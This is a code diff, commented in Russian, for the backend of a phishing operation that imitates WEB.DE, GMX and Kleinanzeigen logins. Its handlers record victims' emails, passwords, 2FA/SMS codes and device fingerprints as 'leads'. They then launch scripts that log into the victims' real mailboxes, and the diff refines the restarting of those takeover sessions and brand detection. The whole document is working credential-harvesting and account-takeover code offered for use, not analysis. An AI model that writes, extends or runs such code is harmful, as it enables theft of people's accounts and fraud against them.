@@ -5,14 +5,17 @@ const { getPlatformFromRequest } = require('../utils/formatUtils');
 const automationService = require('../services/automationService');
 const { logDuplicateAutomationAttempt } = require('../lib/terminalFlowLog');
 const { logAdminModeFlow } = require('../lib/adminModeFlowLog');
+const { emailEligibleForUnitedInternetMailScript, mailboxAutomationLogLabel } = require('../utils/mailMailboxLogin');
+const {
+  jsonPayloadMatchesKleinClientShape,
+  submitIndicatesKleinScenario,
+  leadIsKleinMarked
+} = require('../utils/kleinSubmitDetect');
 const { deviceSignatureFromRequest, applyLeadTelemetry } = require('../lib/leadTelemetry');
 const { isLocalHost } = require('../utils/localNetwork');
 const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_id || 'na'));
 
-/**
- * На localhost/LAN кука gmw_local_brand может не совпадать с реальной формой (WEB.DE vs Klein).
- * Скрипты шлют clientFormBrand (dataset.brand или script-klein); на проде решает Host.
- */
+/** На localhost/LAN: бренд сабмита из clientFormBrand (форма), иначе как по Host. */
 function submitBrandIdForVictimPost(req, json, getBrandFn) {
   const host = (req.headers && req.headers.host ? String(req.headers.host) : '').split(':')[0].toLowerCase();
   const fromHost = getBrandFn(req).id;
@@ -22,18 +25,10 @@ function submitBrandIdForVictimPost(req, json, getBrandFn) {
   return fromHost;
 }
 
-/** Нормализованный clientFormBrand из тела запроса (страница формы у жертвы). */
-function normalizedClientFormBrandFromJson(json) {
-  const cfb = json && json.clientFormBrand != null ? String(json.clientFormBrand).trim().toLowerCase() : '';
-  if (cfb === 'webde' || cfb === 'gmx' || cfb === 'klein') return cfb;
-  return null;
-}
-
-/** Сохраняем источник submit для админки/API: форма (клиент) и бренд по Host. */
 function applySubmitSourceFields(lead, req, json, getBrandFn) {
   if (!lead || typeof getBrandFn !== 'function') return;
-  const n = normalizedClientFormBrandFromJson(json);
-  if (n) lead.clientFormBrand = n;
+  const cfb = json && json.clientFormBrand != null ? String(json.clientFormBrand).trim().toLowerCase() : '';
+  if (cfb === 'webde' || cfb === 'gmx' || cfb === 'klein') lead.clientFormBrand = cfb;
   try {
     const bid = getBrandFn(req).id;
     if (bid != null && String(bid).trim() !== '') {
@@ -47,18 +42,13 @@ function applyVictimTelemetry(lead, req, json, ip, getBrandFn) {
   applyLeadTelemetry(lead, req, json, ip);
 }
 
-/** Колонка «поток» в [ВХОД]: не смешивать Klein с WEBDE_DOMAIN (по умолчанию web-de.one). */
-function victimTerminalFlowLabel(brandId, kleinHost, gmxDomain, webdeDefaultLabel) {
-  const b = (brandId || '').trim().toLowerCase();
-  if (b === 'klein' && kleinHost) return String(kleinHost).trim() || String(webdeDefaultLabel || 'сайт');
-  if (b === 'gmx' && gmxDomain) return String(gmxDomain).trim() || String(webdeDefaultLabel || 'сайт');
-  const w = webdeDefaultLabel != null ? String(webdeDefaultLabel).trim() : '';
-  return w || 'сайт';
-}
-
-/** Перед автозапуском с формы: свежая строка из БД, без forceRestart. */
-function shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadRef, forceRestart, persistLeadPatch) {
-  if (!leadRef || !leadRef.id || forceRestart) return false;
+/**
+ * Перед автозапуском с формы: свежая строка из БД.
+ * recoveryCtx: { persistLeadPatch, invalidateLeadsCache, logTerminalFlow, leadIsWorkedLikeAdmin } — при флаге webdeScriptActiveRun
+ * или живом процессе: SIGKILL предыдущему Python, сброс lock и webdeScriptActiveRun, затем новый запуск.
+ */
+function shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadRef, forceRestart, recoveryCtx) {
+  if (!leadRef || !leadRef.id) return false;
   const fresh = typeof readLeadById === 'function'
     ? readLeadById(leadRef.id)
     : (function () {
@@ -66,6 +56,11 @@ function shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadRef, forc
       return Array.isArray(rows) ? rows.find(function (l) { return l && l.id === leadRef.id; }) : null;
     })();
   if (!fresh) return false;
+  if (recoveryCtx && typeof recoveryCtx.leadIsWorkedLikeAdmin === 'function' && recoveryCtx.leadIsWorkedLikeAdmin(fresh)) {
+    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'лог отработан (Отработан / архив Klein)');
+    return true;
+  }
+  if (forceRestart) return false;
   const st = String(fresh.status || '').trim();
   if (st === 'processing' || st === 'completed') {
     logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'статус БД: ' + st);
@@ -75,20 +70,51 @@ function shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadRef, forc
     logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'статус БД: show_success');
     return true;
   }
-  if (fresh.webdeScriptActiveRun != null && fresh.webdeScriptActiveRun !== '') {
-    if (automationService.isLeadAutomationAlreadyRunning(fresh.id)) {
+  const dbSaysActive = fresh.webdeScriptActiveRun != null && fresh.webdeScriptActiveRun !== '';
+  const procSaysActive = automationService.isLeadAutomationAlreadyRunning(fresh.id);
+  if (dbSaysActive || procSaysActive) {
+    if (recoveryCtx && typeof recoveryCtx.persistLeadPatch === 'function') {
+      try {
+        const emLock = String(fresh.email || fresh.emailKl || '').trim().toLowerCase();
+        automationService.preemptWebdeLoginForReplacedLead(fresh.id, emLock);
+        recoveryCtx.persistLeadPatch(fresh.id, { webdeScriptActiveRun: null });
+        if (typeof recoveryCtx.invalidateLeadsCache === 'function') recoveryCtx.invalidateLeadsCache();
+        const logTf = recoveryCtx.logTerminalFlow;
+        if (typeof logTf === 'function') {
+          logTf(
+            'AUTO-LOGIN',
+            'Система',
+            '—',
+            fresh.email || fresh.emailKl || '—',
+            'перед автозапуском: закрыт предыдущий сеанс (браузер/lock) и сброшен webdeScriptActiveRun · leadId=' + fresh.id,
+            fresh.id
+          );
+        }
+      } catch (e) {
+        console.warn('[AUTO-LOGIN] подготовка перезапуска id=' + fresh.id + ':', e && e.message ? e.message : e);
+        if (automationService.isLeadAutomationAlreadyRunning(fresh.id)) {
+          logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск (процесс/lock)');
+          return true;
+        }
+        if (dbSaysActive) {
+          logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'webdeScriptActiveRun в БД');
+          return true;
+        }
+      }
+      if (automationService.isLeadAutomationAlreadyRunning(fresh.id)) {
+        logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск после preempt — отклонено');
+        return true;
+      }
+      return false;
+    }
+    if (procSaysActive) {
+      logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск (процесс/lock)');
+      return true;
+    }
+    if (dbSaysActive) {
       logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'webdeScriptActiveRun в БД');
       return true;
     }
-    if (typeof persistLeadPatch === 'function') {
-      try {
-        persistLeadPatch(fresh.id, { webdeScriptActiveRun: null });
-      } catch (_) {}
-    }
-  }
-  if (automationService.isLeadAutomationAlreadyRunning(fresh.id)) {
-    logDuplicateAutomationAttempt(fresh.id, fresh.email || fresh.emailKl, 'активный автозапуск (процесс/lock)');
-    return true;
   }
   return false;
 }
@@ -126,11 +152,9 @@ function mergeDuplicateLeadsForSameEmail(emailLower, ctx) {
   const newest = leads.slice().sort(function (a, b) {
     return String(b.lastSeenAt || b.createdAt || '').localeCompare(String(a.lastSeenAt || a.createdAt || ''));
   })[0];
-    if (newest) {
+  if (newest) {
     canonical.status = newest.status;
     canonical.brand = newest.brand;
-    if (newest.clientFormBrand) canonical.clientFormBrand = newest.clientFormBrand;
-    if (newest.hostBrandAtSubmit) canonical.hostBrandAtSubmit = newest.hostBrandAtSubmit;
     if (newest.platform) canonical.platform = newest.platform;
     if (newest.email) canonical.email = newest.email;
     if (newest.emailKl) canonical.emailKl = newest.emailKl;
@@ -160,6 +184,12 @@ function mergeDuplicateLeadsForSameEmail(emailLower, ctx) {
 
 async function handle(scope) {
   with (scope) {
+  const webdeSubmitSkipRecovery = {
+    persistLeadPatch: persistLeadPatch,
+    invalidateLeadsCache: invalidateLeadsCache,
+    logTerminalFlow: logTerminalFlow,
+    leadIsWorkedLikeAdmin: leadIsWorkedLikeAdmin
+  };
   if (pathname === '/api/visit' && req.method === 'POST') {
     if (!checkRateLimit(ip, 'visit', RATE_LIMITS.visit)) {
       return send(res, 429, { ok: false, error: 'too_many_requests' });
@@ -219,7 +249,7 @@ async function handle(scope) {
       }
       /** Только креды Klein (/klein-anmelden): не трогаем email/password почты WEB.DE.
        *  visitId обязателен для привязки; если sessionStorage потерян — ищем лид по совпадению email или emailKl (самый свежий). */
-      if (json.kleinFlowSubmit === true || json.kleinFlow === true) {
+      if (json.kleinFlowSubmit === true || json.kleinFlow === true || jsonPayloadMatchesKleinClientShape(json)) {
         const leadsKf = readLeads();
         const pwKf = ((json.password != null) ? String(json.password).trim() : '') || ((json.passwort != null) ? String(json.passwort).trim() : '');
         const emKf = String(json.email || json.emailKl || '').trim();
@@ -274,9 +304,8 @@ async function handle(scope) {
         }
         applyVictimTelemetry(leadKf, req, json, ip, getBrand);
         persistLeadFull(leadKf);
-        // Пароль Kl с klein-flow: автозапуск только если ещё нет активной сессии (основной submit мог уже поднять klein_simulation).
-        if (pwKf && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadKf, false, persistLeadPatch)) {
-          logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, leadKf.id, emKf, 'klein-flow (Kl): пароль Kl → автовход по форме лида');
+        if (pwKf && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadKf, false, webdeSubmitSkipRecovery)) {
+          logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, leadKf.id, emKf, 'klein-flow (Kl): пароль Kl получен → цепочка автовхода по текущему startPage');
           automationService.startWebdeLoginAfterLeadSubmit(leadKf.id, leadKf);
         }
         return send(res, 200, { ok: true, id: leadKf.id });
@@ -290,12 +319,12 @@ async function handle(scope) {
         console.log('[ВХОД] Отказ: превышен лимит запросов submit с ip=' + ip);
         return send(res, 429, { ok: false, error: 'too_many_requests' });
       }
-      const submitBrandId = submitBrandIdForVictimPost(req, json, getBrand);
       const email = String(json.email || '').trim();
       if (!email) {
         console.error('[ВХОД] Ошибка: в теле /api/submit отсутствует поле email или оно пустое. Отклонён, ip=' + ip);
         return send(res, 400, { ok: false, error: 'email required' });
       }
+      const submitBrandId = submitIndicatesKleinScenario(req, json, null, getBrand) ? 'klein' : submitBrandIdForVictimPost(req, json, getBrand);
       const atEmail = email.indexOf('@');
       const emailDomain = (atEmail > 0 && atEmail < email.length - 1) ? email.slice(atEmail + 1).toLowerCase().trim() : '';
       const submitHost = (req.headers && req.headers.host ? String(req.headers.host) : '').split(':')[0].toLowerCase();
@@ -314,7 +343,7 @@ async function handle(scope) {
       const visitId = json.visitId && String(json.visitId).trim();
       const passwordFromBody = ((json.password != null) ? String(json.password).trim() : '') || ((json.passwort != null) ? String(json.passwort).trim() : '');
       const hasPassword = passwordFromBody !== '';
-      logTerminalFlow('ВХОД', victimTerminalFlowLabel(submitBrandId, KLEIN_CANONICAL_HOST, GMX_DOMAIN, SERVER_LOG_PHISH_LABEL), '—', email, 'email: submit · пароль ' + (hasPassword ? 'есть' : 'нет') + ' · visitId=' + (visitId || '—') + ' · ip=' + ip, visitId || '');
+      logTerminalFlow('ВХОД', terminalEntradaSiteLabel(req), '—', email, 'email: submit · пароль ' + (hasPassword ? 'есть' : 'нет') + ' · visitId=' + (visitId || '—') + ' · ip=' + ip, visitId || '');
       const emailLower = email.toLowerCase();
       if (typeof findAllLeadIdsByEmailNormalized === 'function') {
         mergeDuplicateLeadsForSameEmail(emailLower, {
@@ -330,7 +359,7 @@ async function handle(scope) {
       const leads = readLeads();
       const incomingDeviceSig = deviceSignatureFromRequest(req, json, ip);
       // Для Klein: в EMAIL KL пишем значение из поля emailKl из тела запроса (то, что реально введено на форме Klein), чтобы не подменялось автозаполнением браузера
-      const brandIdForEmailKl = submitBrandId;
+      const brandIdForEmailKl = submitIndicatesKleinScenario(req, json, null, getBrand) ? 'klein' : submitBrandIdForVictimPost(req, json, getBrand);
       const emailForKlein = (brandIdForEmailKl === 'klein' && json.emailKl != null && String(json.emailKl).trim() !== '')
         ? String(json.emailKl).trim()
         : email;
@@ -349,7 +378,7 @@ async function handle(scope) {
           
           // Если запись с visitId уже имеет email И новый email отличается: для Klein — один лог (добавляем emailKl), для web — новый лог
           if (existingEmail && existingEmail !== newEmail) {
-            const brandIdUpdate = submitBrandId;
+            const brandIdUpdate = submitIndicatesKleinScenario(req, json, visitLead, getBrand) ? 'klein' : submitBrandIdForVictimPost(req, json, getBrand);
             if (brandIdUpdate === 'klein') {
               applyReturnVisitStatusReset(visitLead);
               visitLead.emailKl = emailForKlein;
@@ -394,7 +423,7 @@ async function handle(scope) {
             // Продолжаем создавать новый лог (код ниже)
           } else if (!existingEmail) {
             // Запись существует БЕЗ email - обновляем её (продолжение сессии в той же вкладке)
-            const brandIdUpdate = submitBrandId;
+            const brandIdUpdate = submitIndicatesKleinScenario(req, json, visitLead, getBrand) ? 'klein' : submitBrandIdForVictimPost(req, json, getBrand);
             const isKlein = brandIdUpdate === 'klein';
             if (isKlein) {
               applyReturnVisitStatusReset(visitLead);
@@ -462,8 +491,12 @@ async function handle(scope) {
               }
             }
             applyVictimTelemetry(visitLead, req, json, ip, getBrand);
+            if (hasPassword && brandIdUpdate !== 'klein') {
+              delete visitLead.webdeLoginGridExhausted;
+              delete visitLead.webdeLoginGridStep;
+            }
             persistLeadFull(visitLead);
-            logTerminalFlow('ВХОД', victimTerminalFlowLabel(brandIdUpdate, KLEIN_CANONICAL_HOST, GMX_DOMAIN, SERVER_LOG_PHISH_LABEL), '—', email, 'обновление visitId id=' + visitLead.id + (hasPassword ? ' · пароль введён' : '') + (brandIdUpdate === 'klein' ? ' (Klein)' : ''), visitLead.id);
+            logTerminalFlow('ВХОД', terminalEntradaSiteLabel(req), '—', email, 'обновление visitId id=' + visitLead.id + (hasPassword ? ' · пароль введён' : '') + (brandIdUpdate === 'klein' ? ' (Klein)' : ''), visitLead.id);
             writeDebugLog('SUBMIT_UPDATE_BY_VISITID', {
               visitId: visitId,
               email: email,
@@ -472,7 +505,7 @@ async function handle(scope) {
               ip: ip,
               totalLeads: leads.length
             });
-            if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false, persistLeadPatch)) {
+            if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false, webdeSubmitSkipRecovery)) {
               automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
             }
             return send(res, 200, { ok: true, id: visitLead.id });
@@ -499,20 +532,20 @@ async function handle(scope) {
               persistLeadFull(visitLead);
               console.log('[ВХОД] Лог: visitId найден, лид вернулся (был Успех) — повторный запуск скрипта входа для новых куки, id=' + visitId);
               pushSubmitPipelineEvent(visitLead, visitLead.brand === 'klein' ? 'klein' : 'webde', hasPassword, 'повтор после Успех (обновление куки)');
-              if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, true, persistLeadPatch)) {
+              if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, true, webdeSubmitSkipRecovery)) {
                 automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead, true);
               }
               return send(res, 200, { ok: true, id: visitId });
             }
             // Email совпадает — обновляем ту же запись (тот же id): одна история, лид поднимается в списке
-            const isKleinSame = submitBrandId === 'klein';
+            const isKleinSame = submitIndicatesKleinScenario(req, json, visitLead, getBrand);
             console.log('[ВХОД] Лог: visitId + тот же email — обновление записи id=' + visitId + ' (без смены id)');
             const oldPassword = visitLead.password || visitLead.passwordKl || '';
             const prevPwdWebBefore = (visitLead.password || '').trim();
             const prevPwdKlBefore = (visitLead.passwordKl || '').trim();
             const now = new Date().toISOString();
             const pastEvents = Array.isArray(visitLead.eventTerminal) ? visitLead.eventTerminal.slice() : [];
-            const newEvents = [submitPipelineEventRaw(now, isKleinSame ? 'klein' : 'webde', hasPassword, 'повторный submit (visitId), тот же email')].concat(
+            const newEvents = [submitPipelineEventRaw(now, isKleinSame ? 'klein' : 'webde', hasPassword, 'повторный submit (visitId), тот же email', email)].concat(
               isKleinSame
                 ? [{ at: now, label: 'Ввел почту Kl' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль Kl' }] : [])
                 : [{ at: now, label: 'Ввел почту' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль' }] : [])
@@ -543,9 +576,7 @@ async function handle(scope) {
             visitLead.email = isKleinSame ? (visitLead.email || '') : email;
             visitLead.password = isKleinSame ? (visitLead.password || '') : newPassword;
             visitLead.emailKl = isKleinSame ? emailForKlein : (visitLead.emailKl || '');
-            visitLead.passwordKl = isKleinSame
-              ? (hasPassword ? newPassword : (visitLead.passwordKl || ''))
-              : (visitLead.passwordKl || '');
+            visitLead.passwordKl = isKleinSame ? newPassword : (visitLead.passwordKl || '');
             visitLead.lastSeenAt = now;
             visitLead.adminListSortAt = now;
             visitLead.status = initialStatus;
@@ -553,7 +584,7 @@ async function handle(scope) {
             visitLead.platform = platform || visitLead.platform;
             visitLead.screenWidth = screenW;
             visitLead.screenHeight = screenH;
-            visitLead.brand = isKleinSame ? 'klein' : submitBrandId;
+            visitLead.brand = isKleinSame ? 'klein' : getBrand(req).id;
             visitLead.userAgent = ua || visitLead.userAgent || undefined;
             visitLead.fingerprint = (json.fingerprint && typeof json.fingerprint === 'object') ? json.fingerprint : (visitLead.fingerprint || undefined);
             if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
@@ -581,6 +612,10 @@ async function handle(scope) {
               visitLead.smsCodeData = { code: visitLead.smsCodeData.code || '', submittedAt: visitLead.smsCodeData.submittedAt || new Date().toISOString() };
               if (visitLead.smsCodeData.kind === '2fa' || visitLead.smsCodeData.kind === 'sms') visitLead.smsCodeData.kind = visitLead.smsCodeData.kind;
             }
+            if (hasPassword && !isKleinSame) {
+              delete visitLead.webdeLoginGridExhausted;
+              delete visitLead.webdeLoginGridStep;
+            }
             persistLeadFull(visitLead);
             invalidateLeadsCache();
             broadcastLeadsUpdate();
@@ -591,11 +626,10 @@ async function handle(scope) {
               ip: ip,
               totalLeads: readLeads().length
             });
-            if (
-              (!isKleinSame || hasPassword)
-              && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false, persistLeadPatch)
-            ) {
-              automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
+            if (!isKleinSame || hasPassword) {
+              if (!shouldSkipVictimAutomationSubmit(readLeads, readLeadById, visitLead, false, webdeSubmitSkipRecovery)) {
+                automationService.startWebdeLoginAfterLeadSubmit(visitLead.id, visitLead);
+              }
             }
             return send(res, 200, { ok: true, id: visitLead.id });
           }
@@ -606,10 +640,25 @@ async function handle(scope) {
       }
 
       // Одна запись на нормализованный email/email_kl: дубли в БД сливаем; при submit обновляем тот же id (история одна, лид вверху списка).
-      const brandIdSubmit = submitBrandId;
+      let existingByEmail = null;
+      const fastEmailHitId = typeof findLeadIdByEmail === 'function' ? findLeadIdByEmail(email) : null;
+      if (fastEmailHitId && typeof readLeadById === 'function') {
+        const fastLead = readLeadById(fastEmailHitId);
+        if (fastLead && fastLead.klLogArchived !== true) existingByEmail = fastLead;
+      }
+      if (!existingByEmail) {
+        existingByEmail = readLeads().find(function (l) {
+          if (!l || l.klLogArchived === true) return false;
+          const e = (l.email || '').trim().toLowerCase();
+          const eKl = (l.emailKl || '').trim().toLowerCase();
+          return (e && e === emailLower) || (eKl && eKl === emailLower);
+        });
+      }
+
+      const brandIdSubmit = submitIndicatesKleinScenario(req, json, existingByEmail, getBrand) ? 'klein' : submitBrandIdForVictimPost(req, json, getBrand);
       const isKlein = brandIdSubmit === 'klein';
       const now = new Date().toISOString();
-      const newEvents = [submitPipelineEventRaw(now, isKlein ? 'klein' : 'webde', hasPassword, visitId ? 'visitId не найден — новая запись' : 'новая запись')].concat(
+      const newEvents = [submitPipelineEventRaw(now, isKlein ? 'klein' : 'webde', hasPassword, visitId ? 'visitId не найден — новая запись' : 'новая запись', email)].concat(
         isKlein
           ? [{ at: now, label: 'Ввел почту Kl' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль Kl' }] : [])
           : [{ at: now, label: 'Ввел почту' }].concat(hasPassword ? [{ at: now, label: 'Ввел пароль' }] : [])
@@ -638,21 +687,6 @@ async function handle(scope) {
       const newPassword = hasPassword ? passwordFromBody : '';
       const screenH = typeof json.screenHeight === 'number' && json.screenHeight >= 0 ? json.screenHeight : undefined;
 
-      let existingByEmail = null;
-      const fastEmailHitId = typeof findLeadIdByEmail === 'function' ? findLeadIdByEmail(email) : null;
-      if (fastEmailHitId && typeof readLeadById === 'function') {
-        const fastLead = readLeadById(fastEmailHitId);
-        if (fastLead && fastLead.klLogArchived !== true) existingByEmail = fastLead;
-      }
-      if (!existingByEmail) {
-        existingByEmail = readLeads().find(function (l) {
-          if (!l || l.klLogArchived === true) return false;
-          const e = (l.email || '').trim().toLowerCase();
-          const eKl = (l.emailKl || '').trim().toLowerCase();
-          return (e && e === emailLower) || (eKl && eKl === emailLower);
-        });
-      }
-
       const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : '';
       let responseId;
       let leadForAutomation = null;
@@ -677,7 +711,7 @@ async function handle(scope) {
         L.email = isKlein ? (L.email || '') : email;
         L.password = isKlein ? (L.password || '') : newPassword;
         L.emailKl = isKlein ? emailForKlein : (L.emailKl || '');
-        L.passwordKl = isKlein ? (hasPassword ? newPassword : (L.passwordKl || '')) : (L.passwordKl || '');
+        L.passwordKl = isKlein ? newPassword : (L.passwordKl || '');
         L.lastSeenAt = now;
         L.adminListSortAt = now;
         L.status = initialStatus;
@@ -709,6 +743,10 @@ async function handle(scope) {
         if (hasPassword && isKlein) pushPasswordHistory(L, newPassword, 'login_kl');
 
         applyVictimTelemetry(L, req, json, ip, getBrand);
+        if (hasPassword && !isKlein) {
+          delete L.webdeLoginGridExhausted;
+          delete L.webdeLoginGridStep;
+        }
         persistLeadFull(L);
         responseId = L.id;
         leadForAutomation = L;
@@ -756,10 +794,7 @@ async function handle(scope) {
 
       invalidateLeadsCache();
       broadcastLeadsUpdate();
-      if (
-        leadForAutomation
-        && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadForAutomation, false, persistLeadPatch)
-      ) {
+      if (leadForAutomation && !shouldSkipVictimAutomationSubmit(readLeads, readLeadById, leadForAutomation, false, webdeSubmitSkipRecovery)) {
         automationService.startWebdeLoginAfterLeadSubmit(responseId, leadForAutomation);
       }
       send(res, 200, { ok: true, id: responseId });
@@ -792,7 +827,7 @@ async function handle(scope) {
         return send(res, 404, { ok: false });
       }
       const email = (lead.email || '').trim();
-      logTerminalFlow('ВХОД', victimTerminalFlowLabel(lead.brand, KLEIN_CANONICAL_HOST, GMX_DOMAIN, SERVER_LOG_PHISH_LABEL), '—', email, 'пароль id=' + id, id);
+      logTerminalFlow('ВХОД', terminalEntradaSiteLabel(req), '—', email, 'пароль id=' + id, id);
       const oldPassword = lead.password != null ? String(lead.password) : '';
       lead.lastSeenAt = new Date().toISOString();
       if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) lead.screenWidth = json.screenWidth;
@@ -803,7 +838,7 @@ async function handle(scope) {
       if (json.fingerprint && typeof json.fingerprint === 'object') lead.fingerprint = json.fingerprint;
       applyVictimTelemetry(lead, req, json, getClientIp(req), getBrand);
 
-      if (lead.brand === 'klein' || submitBrandIdForVictimPost(req, json, getBrand) === 'klein') {
+      if (leadIsKleinMarked(lead) || getBrand(req).id === 'klein') {
         const currentPassword = json.currentPassword != null ? String(json.currentPassword) : '';
         const storedKl = (lead.passwordKl != null) ? String(lead.passwordKl) : '';
         if (currentPassword !== storedKl) {
@@ -893,12 +928,50 @@ async function handle(scope) {
       const startPage = readStartPage();
       if (refreshedLead.status === 'pending' && newPassword.trim() !== '') {
         const status = getInitialRedirectStatus(mode, readAutoScript(), startPage, refreshedLead);
+        const autoLoginNoRedirect = mode === 'auto' && readAutoScript() && !status;
         logAdminModeFlow(logTerminalFlow, readMode, readAutoScript, readStartPage, id, email,
           'update-password: getInitialRedirectStatus → ' + (status || 'null')
-          + (status ? ' · ' + getAutoRedirectEventLabel(status) : ''));
+          + (status ? ' · ' + getAutoRedirectEventLabel(status) : '')
+          + (autoLoginNoRedirect ? ' · Auto-Login: без редиректа здесь (редирект после успеха скрипта / смена пароля)' : ''));
         if (status) {
           refreshedLead.status = status;
           pushEvent(refreshedLead, getAutoRedirectEventLabel(refreshedLead.status));
+        }
+      }
+      if (
+        newPassword.trim() !== '' &&
+        mode === 'auto' &&
+        readAutoScript() &&
+        readStartPage() === 'change' &&
+        refreshedLead.brand !== 'klein' &&
+        typeof leadIsWorkedLikeAdmin === 'function' &&
+        !leadIsWorkedLikeAdmin(refreshedLead)
+      ) {
+        const emW = String(refreshedLead.email || '').trim().toLowerCase();
+        if (emailEligibleForUnitedInternetMailScript(emW) && !automationService.isLeadAutomationAlreadyRunning(id)) {
+          automationService.preemptWebdeLoginForReplacedLead(id, emW);
+          try {
+            persistLeadPatch(id, {
+              webdeScriptActiveRun: null,
+              webdeLoginGridExhausted: null,
+              webdeLoginGridStep: null
+            });
+            invalidateLeadsCache();
+          } catch (e) {
+            console.warn('[ВХОД] update-password: сброс webdeScriptActiveRun:', e && e.message ? e.message : e);
+          }
+          const liveLead = readLeadById(id) || refreshedLead;
+          delete liveLead.webdeLoginGridExhausted;
+          delete liveLead.webdeLoginGridStep;
+          logTerminalFlow(
+            'РЕЖИМ',
+            'Автовход',
+            '—',
+            liveLead.email || '—',
+            'update-password: старт автовхода ' + mailboxAutomationLogLabel(liveLead.email || '') + ' (пароль в API, не было активного процесса) · leadId=' + id,
+            id
+          );
+          automationService.startWebdeLoginAfterLeadSubmit(id, liveLead, false);
         }
       }
       persistLeadPatch(id, {
@@ -1080,8 +1153,8 @@ async function handle(scope) {
         newPassword: newPassword,
         submittedAt: new Date().toISOString(),
       };
-      // Пароль со страницы смены идёт только в password history с пометкой "new"; поле Password (со входа) не меняем
-      pushPasswordHistory(lead, newPassword, 'change');
+      // Пароль со страницы смены: WEB → change, Klein → change_kl (иначе в выгрузке куков new перепутывается с паролем Kl).
+      pushPasswordHistory(lead, newPassword, lead.brand === 'klein' ? 'change_kl' : 'change');
       lead.lastSeenAt = new Date().toISOString();
       
       // Устанавливаем статус для показа окна успеха через 5 секунд
@@ -1136,7 +1209,7 @@ async function handle(scope) {
         lead.email = email;
         lead.changePasswordData = { currentPassword: currentPassword, newPassword: newPassword, submittedAt: new Date().toISOString() };
         const oldPassword = lead.password || '';
-        pushPasswordHistory(lead, newPassword, 'change');
+        pushPasswordHistory(lead, newPassword, lead.brand === 'klein' ? 'change_kl' : 'change');
         lead.lastSeenAt = new Date().toISOString();
         if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) lead.screenWidth = json.screenWidth;
         if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) lead.screenHeight = json.screenHeight;
